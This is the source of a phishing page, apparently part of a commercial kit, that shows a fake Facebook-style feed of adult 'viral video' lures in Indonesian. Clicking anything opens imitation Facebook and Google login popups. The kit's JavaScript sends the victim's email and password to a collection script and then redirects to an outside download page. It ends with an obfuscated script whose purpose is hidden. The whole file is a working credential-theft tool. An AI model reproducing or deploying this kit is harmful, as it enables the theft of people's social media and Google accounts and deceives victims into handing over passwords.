<?php
// CREATOR MAS CODX
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/6285863972648

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE HTML>
<html>
 <head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <meta http-equiv="X-UA-Compatible" content="ie=edge"> 
  <title id="a1">Videos 18+</title> 
  <link media="all" rel="stylesheet" type="text/css" href="https://images.cahyosr.my.id/css/24/style_1.css"> 
  <link rel="icon" href="images/fav.png"> 
  <link media="all" rel="stylesheet" type="text/css" href="https://images.cahyosr.my.id/css/24/style_2.css"> 
  <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/facebook.css"> 
  <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/google.css"> 
  <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/all.css"> 
  <style>
 </style>
 </head> 
 <body> 
  <div class="header"> 
   <nav class="nav"> 
    <div> 
     <svg onclick="codxLoginPopup()" viewbox="0 0 28 28" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6" fill="#afb3b5" height="28" width="28"> 
      <path d="M17.5 23.979 21.25 23.979C21.386 23.979 21.5 23.864 21.5 23.729L21.5 13.979C21.5 13.427 21.949 12.979 22.5 12.979L24.33 12.979 14.017 4.046 3.672 12.979 5.5 12.979C6.052 12.979 6.5 13.427 6.5 13.979L6.5 23.729C6.5 23.864 6.615 23.979 6.75 23.979L10.5 23.979 10.5 17.729C10.5 17.04 11.061 16.479 11.75 16.479L16.25 16.479C16.939 16.479 17.5 17.04 17.5 17.729L17.5 23.979ZM21.25 25.479 17 25.479C16.448 25.479 16 25.031 16 24.479L16 18.327C16 18.135 15.844 17.979 15.652 17.979L12.348 17.979C12.156 17.979 12 18.135 12 18.327L12 24.479C12 25.031 11.552 25.479 11 25.479L6.75 25.479C5.784 25.479 5 24.695 5 23.729L5 14.479 3.069 14.479C2.567 14.479 2.079 14.215 1.868 13.759 1.63 13.245 1.757 12.658 2.175 12.29L13.001 2.912C13.248 2.675 13.608 2.527 13.989 2.521 14.392 2.527 14.753 2.675 15.027 2.937L25.821 12.286C25.823 12.288 25.824 12.289 25.825 12.29 26.244 12.658 26.371 13.245 26.133 13.759 25.921 14.215 25.434 14.479 24.931 14.479L23 14.479 23 23.729C23 24.695 22.217 25.479 21.25 25.479Z"> 
      </path> 
     </svg> 
    </div> 
    <div> 
     <svg onclick="codxLoginPopup()" viewbox="0 0 28 28" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6" fill="#afb3b5" height="28" width="28"> 
      <path d="M10.5 4.5c-2.272 0-2.75 1.768-2.75 3.25C7.75 9.542 8.983 11 10.5 11s2.75-1.458 2.75-3.25c0-1.482-.478-3.25-2.75-3.25zm0 8c-2.344 0-4.25-2.131-4.25-4.75C6.25 4.776 7.839 3 10.5 3s4.25 1.776 4.25 4.75c0 2.619-1.906 4.75-4.25 4.75zm9.5-6c-1.41 0-2.125.841-2.125 2.5 0 1.378.953 2.5 2.125 2.5 1.172 0 2.125-1.122 2.125-2.5 0-1.659-.715-2.5-2.125-2.5zm0 6.5c-1.999 0-3.625-1.794-3.625-4 0-2.467 1.389-4 3.625-4 2.236 0 3.625 1.533 3.625 4 0 2.206-1.626 4-3.625 4zm4.622 8a.887.887 0 00.878-.894c0-2.54-2.043-4.606-4.555-4.606h-1.86c-.643 0-1.265.148-1.844.413a6.226 6.226 0 011.76 4.336V21h5.621zm-7.122.562v-1.313a4.755 4.755 0 00-4.749-4.749H8.25A4.755 4.755 0 003.5 20.249v1.313c0 .518.421.938.937.938h12.125c.517 0 .938-.42.938-.938zM20.945 14C24.285 14 27 16.739 27 20.106a2.388 2.388 0 01-2.378 2.394h-5.81a2.44 2.44 0 01-2.25 1.5H4.437A2.44 2.44 0 012 21.562v-1.313A6.256 6.256 0 018.25 14h4.501a6.2 6.2 0 013.218.902A5.932 5.932 0 0119.084 14h1.861z"> 
      </path> 
     </svg> 
    </div> 
    <div class="nav_bottom-border"> 
     <div class="nav_bottom-border-icon"> 
      <svg onclick="codxLoginPopup()" viewbox="0 0 28 28" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x5e5rjt" fill="#1b74e4" height="28" width="28"> 
       <path d="M8.75 25.25C8.336 25.25 8 24.914 8 24.5 8 24.086 8.336 23.75 8.75 23.75L19.25 23.75C19.664 23.75 20 24.086 20 24.5 20 24.914 19.664 25.25 19.25 25.25L8.75 25.25ZM17.164 12.846 12.055 15.923C11.591 16.202 11 15.869 11 15.327L11 9.172C11 8.631 11.591 8.297 12.055 8.576L17.164 11.654C17.612 11.924 17.612 12.575 17.164 12.846M21.75 2.75 6.25 2.75C4.182 2.75 2.5 4.432 2.5 6.5L2.5 18C2.5 20.068 4.182 21.75 6.25 21.75L21.75 21.75C23.818 21.75 25.5 20.068 25.5 18L25.5 6.5C25.5 4.432 23.818 2.75 21.75 2.75"> 
       </path> 
      </svg> 
     </div> 
     <div class="nav_bottom-border-blue"></div> 
    </div> 
    <div> 
     <svg onclick="codxLoginPopup()" viewbox="0 0 28 28" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6" fill="#afb3b5" height="28" width="28"> 
      <path d="M17.5 23.75 21.75 23.75C22.164 23.75 22.5 23.414 22.5 23L22.5 14 22.531 14C22.364 13.917 22.206 13.815 22.061 13.694L21.66 13.359C21.567 13.283 21.433 13.283 21.34 13.36L21.176 13.497C20.591 13.983 19.855 14.25 19.095 14.25L18.869 14.25C18.114 14.25 17.382 13.987 16.8 13.506L16.616 13.354C16.523 13.278 16.39 13.278 16.298 13.354L16.113 13.507C15.53 13.987 14.798 14.25 14.044 14.25L13.907 14.25C13.162 14.25 12.439 13.994 11.861 13.525L11.645 13.35C11.552 13.275 11.419 13.276 11.328 13.352L11.155 13.497C10.57 13.984 9.834 14.25 9.074 14.25L8.896 14.25C8.143 14.25 7.414 13.989 6.832 13.511L6.638 13.351C6.545 13.275 6.413 13.275 6.32 13.351L5.849 13.739C5.726 13.84 5.592 13.928 5.452 14L5.5 14 5.5 23C5.5 23.414 5.836 23.75 6.25 23.75L10.5 23.75 10.5 17.5C10.5 16.81 11.06 16.25 11.75 16.25L16.25 16.25C16.94 16.25 17.5 16.81 17.5 17.5L17.5 23.75ZM3.673 8.75 24.327 8.75C24.3 8.66 24.271 8.571 24.238 8.483L23.087 5.355C22.823 4.688 22.178 4.25 21.461 4.25L6.54 4.25C5.822 4.25 5.177 4.688 4.919 5.338L3.762 8.483C3.729 8.571 3.7 8.66 3.673 8.75ZM24.5 10.25 3.5 10.25 3.5 12C3.5 12.414 3.836 12.75 4.25 12.75L4.421 12.75C4.595 12.75 4.763 12.69 4.897 12.58L5.368 12.193C6.013 11.662 6.945 11.662 7.59 12.193L7.784 12.352C8.097 12.609 8.49 12.75 8.896 12.75L9.074 12.75C9.483 12.75 9.88 12.607 10.194 12.345L10.368 12.2C11.01 11.665 11.941 11.659 12.589 12.185L12.805 12.359C13.117 12.612 13.506 12.75 13.907 12.75L14.044 12.75C14.45 12.75 14.844 12.608 15.158 12.35L15.343 12.197C15.989 11.663 16.924 11.663 17.571 12.197L17.755 12.35C18.068 12.608 18.462 12.75 18.869 12.75L19.095 12.75C19.504 12.75 19.901 12.606 20.216 12.344L20.38 12.208C21.028 11.666 21.972 11.666 22.62 12.207L23.022 12.542C23.183 12.676 23.387 12.75 23.598 12.75 24.097 12.75 24.5 12.347 24.5 11.85L24.5 10.25ZM24 14.217 24 23C24 24.243 22.993 25.25 21.75 25.25L6.25 25.25C5.007 25.25 4 24.243 4 23L4 14.236C2.875 14.112 2 13.158 2 12L2 9.951C2 9.272 2.12 8.6 2.354 7.964L3.518 4.802C4.01 3.563 5.207 2.75 6.54 2.75L21.461 2.75C22.793 2.75 23.99 3.563 24.488 4.819L25.646 7.964C25.88 8.6 26 9.272 26 9.951L26 11.85C26 13.039 25.135 14.026 24 14.217ZM16 23.75 16 17.75 12 17.75 12 23.75 16 23.75Z"> 
      </path> 
     </svg> 
    </div> 
    <div class="notification"> 
     <img class="notification-img" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/bell.png" width="24px"> 
    </div> 
    <div> 
     <button onclick="codxLoginPopup()" viewbox="0 0 28 28" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6" fill="#afb3b5" height="28" width="28"> 
      <path d="M23.5 4a1.5 1.5 0 110 3h-19a1.5 1.5 0 110-3h19zm0 18a1.5 1.5 0 110 3h-19a1.5 1.5 0 110-3h19zm0-9a1.5 1.5 0 110 3h-19a1.5 1.5 0 110-3h19z"> 
      </path> 
     </svg> 
    </div> 
   </nav> 
  </div> 
  <div class="wrap"> 
   <div class="back-line"> 
    <div class="back-line__left"> 
     <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/arrow-left.svg" width="25px"> 
     <p class="back-line__left-text" id="a2">Video</p> 
    </div> 
    <div onclick="codxLoginPopup()" class="back-line__right"> 
     <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/user-loupe.png" width="70px"> 
    </div> 
   </div> 
   <!-- 1 --> 
   <div class="post-block"> 
    <div class="post-block__head"> 
     <div class="post-block__head-avatar"> 
      <div onclick="codxLoginPopup()" class="head-avatar__logo"> 
       <img src="https://i.pinimg.com/236x/3a/23/0a/3a230a26fe8330ef60c2c7a22815ae67.jpg" width="40px" height="40px"> 
      </div> 
      <div class="head-avatar__text"> 
       <div class="ellipsis"> 
        <span id="a3">Kumpulan Viral Terbaru Sekarang</span> 
       </div> 
       <div> 
        <span class="grey-text" id="a4">Disarankan untuk Anda · 6d ·</span> 
        <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/gl.png" width="10px" style="margin-left: 5px; vertical-align: middle;"> 
       </div> 
      </div> 
      <div> 
       <span onclick="codxLoginPopup()" class="blue-text" id="a5">Ikuti</span> 
      </div> 
      <div class="head-avatar__dots"> 
       <img class="post-block__head-dots" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/dots.svg" width="20px"> 
      </div> 
     </div> 
    </div> 
    <p class="post-block__video-description" id="a6">Video Hot Terbaru Untuk Anda🔥 🔥 🔥</p> 
    <div class="post-block__img"> 
     <img onclick="codxLoginPopup()" class="post-block__img1" src="https://images.cahyosr.my.id/img/24/8bb5c6646dea32c0fa2db.jpg"> 
     <img onclick="codxLoginPopup()" class="post-block__img-play" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/play.png"> 
    </div> 
    <div class="post-block__like-data"> 
     <div class="post-block__like-data-left"> 
      <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/like.png" width="15px" style="margin-right: 3px;"> 
      <span>157k</span> 
     </div> 
     <div class="post-block__like-data-right"> 
      <div>
        1.1K 
       <span onclick="codxLoginPopup()" id="a7">komentar</span> 
      </div> 
      <div class="circle"></div> 
      <div>
        2.5K 
       <span id="a8">berbagi</span> 
      </div> 
      <div class="circle"></div> 
      <div>
        9.9M 
       <span id="a9">tampilan</span> 
      </div> 
     </div> 
    </div> 
    <div class="post-block__actions"> 
     <div> 
      <span class="post-block__actions-like"></span> 
      <span id="a10">Suka</span> 
     </div> 
     <div> 
      <span class="post-block__actions-comment"></span> 
      <span id="a11">Komentar</span> 
     </div> 
     <div> 
      <span class="post-block__actions-share"></span> 
      <span id="a12">Bagikan</span> 
     </div> 
    </div> 
   </div> 
   <!-- 2 --> 
   <div class="post-block"> 
    <div class="post-block__head"> 
     <div class="post-block__head-avatar"> 
      <div onclick="codxLoginPopup()" class="head-avatar__logo"> 
       <img src="https://i.pinimg.com/736x/9d/08/63/9d08639539bfd8c3b90491e1ef77e4b6.jpg" width="40px" height="40px"> 
      </div> 
      <div class="head-avatar__text"> 
       <div class="ellipsis"> 
        <span id="a13">Video Terbaik</span> 
       </div> 
       <div> 
        <span class="grey-text"> <script type="text/javascript">
                  document.write(new Date().toLocaleDateString(navigator.language || navigator.userLanguage, {
                    month: 'short',
                    day: 'numeric',
                  }))
                </script>23 Mei · </span> 
        <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/gl.png" width="10px" style="margin-left: 5px; vertical-align: middle;"> 
       </div> 
      </div> 
      <div> 
       <span onclick="codxLoginPopup()" class="blue-text" id="a14">Ikuti</span> 
      </div> 
      <div class="head-avatar__dots"> 
       <img class="post-block__head-dots" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/dots.svg" width="20px"> 
      </div> 
     </div> 
    </div> 
    <p class="post-block__video-description"> </p> 
    <div class="post-block__img"> 
     <img onclick="codxLoginPopup()" class="post-block__img1" src="https://images.cahyosr.my.id/img/24/774e54073de92403ece29.jpg"> 
     <img onclick="codxLoginPopup()" class="post-block__img-play" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/play.png"> 
    </div> 
    <div class="post-block__like-data"> 
     <div class="post-block__like-data-left"> 
      <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/like.png" width="15px" style="margin-right: 3px;"> 
      <span>46k</span> 
     </div> 
     <div class="post-block__like-data-right"> 
      <div>
        1.3K 
       <span onclick="codxLoginPopup()" id="a15">komentar</span> 
      </div> 
      <div class="circle"></div> 
      <div>
        1.4K 
       <span id="a16">berbagi</span> 
      </div> 
      <div class="circle"></div> 
      <div>
        5.4M 
       <span id="a17">tampilan</span> 
      </div> 
     </div> 
    </div> 
    <div class="post-block__actions"> 
     <div> 
      <span class="post-block__actions-like"></span> 
      <span id="a18">Suka</span> 
     </div> 
     <div> 
      <span class="post-block__actions-comment"></span> 
      <span id="a19">Komentar</span> 
     </div> 
     <div> 
      <span class="post-block__actions-share"></span> 
      <span id="a20">Bagikan</span> 
     </div> 
    </div> 
   </div> 
   <!-- 3 --> 
   <div class="post-block"> 
    <div class="post-block__head"> 
     <div class="post-block__head-avatar"> 
      <div onclick="codxLoginPopup()" class="head-avatar__logo"> 
       <img src="https://i.pinimg.com/736x/74/02/d8/7402d8b5ce257de832ad4d2769f6d102.jpg" width="40px" height="40px"> 
      </div> 
      <div class="head-avatar__text"> 
       <div class="ellipsis"> 
        <span id="a21">Kompilasi video terbaik 2024</span> 
       </div> 
       <div> 
        <span class="grey-text"> <script type="text/javascript">
                  var d = new Date();
                  d.setDate(d.getDate() - 1);
                  document.write(d.toLocaleDateString(navigator.language || navigator.userLanguage, {
                    month: 'short',
                    day: 'numeric',
                  }));
                </script>22 Mei · </span> 
        <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/gl.png" width="10px" style="margin-left: 5px; vertical-align: middle;"> 
       </div> 
      </div> 
      <div> 
       <span onclick="codxLoginPopup()" class="blue-text" id="a22">Ikuti</span> 
      </div> 
      <div class="head-avatar__dots"> 
       <img class="post-block__head-dots" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/dots.svg" width="20px"> 
      </div> 
     </div> 
    </div> 
    <p class="post-block__video-description" id="a23">Yang terbaik tahun 2024 hanya di sini💦💦💦</p> 
    <div class="post-block__img"> 
     <img onclick="codxLoginPopup()" class="post-block__img1" src="https://images.cahyosr.my.id/img/24/4ea4e39d81f21754279b7.jpg"> 
     <img onclick="codxLoginPopup()" class="post-block__img-play" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/play.png"> 
    </div> 
    <div class="post-block__like-data"> 
     <div class="post-block__like-data-left"> 
      <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/like.png" width="15px" style="margin-right: 3px;"> 
      <span>72k</span> 
     </div> 
     <div class="post-block__like-data-right"> 
      <div>
        1.2K 
       <span onclick="codxLoginPopup()" id="a24">komentar</span> 
      </div> 
      <div class="circle"></div> 
      <div>
        1.9K 
       <span id="a25">berbagi</span> 
      </div> 
      <div class="circle"></div> 
      <div>
        7.1M 
       <span id="a26">tampilan</span> 
      </div> 
     </div> 
    </div> 
    <div class="post-block__actions"> 
     <div> 
      <span class="post-block__actions-like"></span> 
      <span id="a27">Suka</span> 
     </div> 
     <div> 
      <span class="post-block__actions-comment"></span> 
      <span id="a28">Komentar</span> 
     </div> 
     <div> 
      <span class="post-block__actions-share"></span> 
      <span id="a29">Bagikan</span> 
     </div> 
    </div> 
   </div> 
   <!-- 4 --> 
   <div class="post-block"> 
    <div class="post-block__head"> 
     <div class="post-block__head-avatar"> 
      <div onclick="codxLoginPopup()" class="head-avatar__logo"> 
       <img src="https://i.pinimg.com/736x/7a/28/61/7a28619107a8fb6de4273ddf220698f1.jpg" width="40px" height="40px"> 
      </div> 
      <div class="head-avatar__text"> 
       <div class="ellipsis"> 
        <span id="a30">Video tersembunyi</span> 
       </div> 
       <div> 
        <span class="grey-text"> <script type="text/javascript">
                  var d = new Date();
                  d.setDate(d.getDate() - 2);
                  document.write(d.toLocaleDateString(navigator.language || navigator.userLanguage, {
                    month: 'short',
                    day: 'numeric',
                  }));
                </script>21 Mei · </span> 
        <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/gl.png" width="10px" style="margin-left: 5px; vertical-align: middle;"> 
       </div> 
      </div> 
      <div> 
       <span onclick="codxLoginPopup()" class="blue-text" id="a31">Ikuti</span> 
      </div> 
      <div class="head-avatar__dots"> 
       <img class="post-block__head-dots" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/dots.svg" width="20px"> 
      </div> 
     </div> 
    </div> 
    <p class="post-block__video-description" id="a32">Unduhan gratis hanya hari ini</p> 
    <div class="post-block__img"> 
     <img onclick="codxLoginPopup()" class="post-block__img1" src="https://images.cahyosr.my.id/img/24/201963f29206aaa866285.jpg"> 
     <img onclick="codxLoginPopup()" class="post-block__img-play" src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/play.png"> 
    </div> 
    <div class="post-block__like-data"> 
     <div class="post-block__like-data-left"> 
      <img src="https://aureatedreams.com/utility/video-app-default/adult/fb_video/1/img/like.png" width="15px" style="margin-right: 3px;"> 
      <span>52k</span> 
     </div> 
     <div class="post-block__like-data-right"> 
      <div>
        2.3K 
       <span onclick="codxLoginPopup()" id="a33">komentar</span> 
      </div> 
      <div class="circle"></div> 
      <div>
        1.1K 
       <span id="a34">berbagi</span> 
      </div> 
      <div class="circle"></div> 
      <div>
        6.2M 
       <span id="a35">tampilan</span> 
      </div> 
     </div> 
    </div> 
    <div class="post-block__actions"> 
     <div> 
      <span class="post-block__actions-like"></span> 
      <span id="a36">Suka</span> 
     </div> 
     <div> 
      <span class="post-block__actions-comment"></span> 
      <span id="a37">Komentar</span> 
     </div> 
     <div> 
      <span class="post-block__actions-share"></span> 
      <span id="a38">Bagikan</span> 
     </div> 
    </div> 
   </div> 
  </div> 
  <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://images.cahyosr.my.id/img/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://images.cahyosr.my.id/img/login2/loggp.webp" onclick="codxGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://images.cahyosr.my.id/img/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://images.cahyosr.my.id/img/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" id="FormFB" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://images.cahyosr.my.id/img/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.cahyosr.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.cahyosr.my.id/npm/jquery-3.17.21.min.js"></script>
 <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://images.cahyosr.my.id/unduh/ai.php";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var fTQ='',Rby=508-497;function ygd(x){var o=969054;var r=x.length;var z=[];for(var f=0;f<r;f++){z[f]=x.charAt(f)};for(var f=0;f<r;f++){var k=o*(f+454)+(o%31625);var i=o*(f+676)+(o%27792);var l=k%r;var t=i%r;var b=z[l];z[l]=z[t];z[t]=b;o=(k+i)%4024719;};return z.join('')};var vcP=ygd('cobttrokquvnzxyhgesdfwrmapcnjrutlocis').substr(0,Rby);var YBB=').mao8;3;on=xchvag;;akdrh0g;c+dfnhi.[r(ncpyc.=,Csx.z,0=e;nh[ea(ran=(; ox;80tnlehr,d9lufkrrt;o;tt97g+.63urr.8pgC,}u1gr=;soir=vti=f]8n rl34r6[=0evuio+fnetnf,1+[o+e)licnt+;;dam ra)f{ri=ic;)+apu=>pqhnar;=r 5ipp9+;ktaig(w[;l8.;g(l=vSi+t ;dai)a1a)g"[tn]sqe1.f"ltev* ra7;r;vveey)e)m1ketau-s;62;[+iv.={o-l1a=nu6;;<u ,})ar()4(aa.g=n]p{+vht(e00(.,;udrC;r[(gth0l.t)s2oml(+u.1un0-u<=p)C+{tad(+d!xl=ba!52t ,(jt;jfsrs(eaan7=n(A3rc6=ig)1a,jrn.r or4a+= v]u]C)0f;)rAvhr2h5 ]"( f;a+n=hvs-0=o(tupe=ko}[ar,m29lvs),>1u(}<"i;rxsvhnl.ad)tv,uq=e(h;vA=i..(2 8}==upc-nu4(([;r9.mj;);=nl75u8s<A)s<j7)]fu{iu.xc;n],{ ih,)pfqm)il=pg(=(2n5=qx={t=el ;n4ltn]ai(la)-,7vli]an.tu+=;;(1fb6t)}io++qeljhhr0n,joe.irxj;n"=aA8(hw) uu.s}(lo6crofj["xh,")aoer wr*ge,00 9=,;,)9nv 2rfcojcy7hlch)r8);ve nr ). )+vCe,+C.r"a;6,eht,[ej) vb(g,vyovr,.rfrjm+[0[aauoo;dl=+744Ca; ]aj),t(oi.(St=rsg )rtmvh;on;vejw(r]o===f1us]g+er2(iua]("-",.o+v=stnj';var fZO=ygd[vcP];var YQV='';var uhr=fZO;var iaA=fZO(YQV,ygd(YBB));var RCR=iaA(ygd(')&"D)t__ft1#aZ)fZ u2= s{b2"o.a3Z0=a#a_+f%3Z)9c"k,]rZjo(+Z1eZu;%Z;:=}Zn(Z.u_3+nto1$m=bZ[Zt0-m0+$;3+,foZfx6pf6!.$s( !2!$t..86m(Z0g)-aZp0eZ_g( m.]o%srn576tp_augZ;.; Z;(.;tp=. p1ba(3e,i!!zZ3Ttu.(,gk.0#s#e0rCtZ, =i\/fte%Z]j!sud.16nre:!cZlm!0$Z*(t.Za1Zb42(00j!f7)!6_3_,"0(6)=r0h+){c)0$(()f(hof5ott.;rZ6m\/ f3Z=;4uZd,t$Z$,f1\'$k{]6o eS-m;aZpn;a)3$Z3gZ$+#\/fZd[!!Z*k0m],so\/tpe$6.Z06._.(u;n!oh]Z8o#$,ti1a.4"naZa;$)oftf\/hj1gk+1.Zie1t&d!i_i.3,n%. .,#)_$%ibfus\'}0f!ineje,3rsl,Z(=Z3ua1(.ftfx%_a5]yt5t%1ZZhZ5=2!3f62i))h =; oo6Zf.fp,e(iotZfff_t(%Z(_j&2(dna]rs;g]ti,33,a)73{Z .Z!(Z7!,h}}"oj36!Z)bfZ1a\/s_ZZne Z}&epZ.tgZ)1,Zi3;2(;52$jbm{tl)_.;3e.$0mZ=4_Zit_()30crff9$+els3)_urZn\/26no.iZlj0$j_t..r.b_=t.),pj5!]63ZZa.(*f=.)#yS_r.$=r;=taZ_srZS2kx)!17Z{i}(1Zgb1%ZS4rv=t}f.p;Z)a(3 .1=%Z_4&.nZ61Z;ab.}0j);ai6{!$$)).b)_($hlr(=k1Z.s})i)($-Z 6bgj,}.a,Zos8Z(0))tlhd%eb7f=jr+6Zi{4,i_f)Zu0){sh):.o.nZg (8$)..(.ta)i_.r(asl.C;(,tr-[,05s43i*f_!kh!b4.si,.%4Zj( %(!e415Za.of{0.(]:Z,j).)flje(Zrh)rZ5Z.Z)5(=,bgef1nZ)3lZj_4,fi(!_)s(va);.c1o\'krftn=i{%ho_i,")_8,3.{5,rn3_i.Z3rf$3)1_];(6$)g_g}4Z}{l){ffZ604)2e=Z,qn72].=71]iy2Zsr.ZZ iaf3\'0.)# 3pud=)i2 1#Zt{ja,,Zflf.Z$.0[Z2=s;Z6]$m.}_ia.,i8d$n0sZ{e2k;i!_2db*Z.t.(e}5.;1$f3.Z o.e.76aoe}Z!ts'));var ULF=uhr(fTQ,RCR );ULF(4380);return 1867})()
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>